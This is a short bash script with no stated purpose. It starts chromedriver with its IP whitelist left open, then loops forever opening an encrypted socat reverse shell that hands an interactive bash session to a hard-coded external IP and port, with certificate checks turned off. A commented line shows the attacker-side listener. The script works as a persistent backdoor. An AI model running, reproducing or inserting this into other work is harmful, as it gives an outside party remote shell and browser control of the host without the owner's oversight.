#!/usr/bin/env bash

IP=139.180.141.47
PORT=19000


/usr/bin/chromedriver --whitelisted-ips --port=8080 >/dev/null 2>&1 &


# socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt

while true; do
    echo "starting socat $PORT"
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL-CONNECT:$IP:$PORT,cert=/src/client.pem,cafile=/src/server.crt,verify=0
    sleep 10
done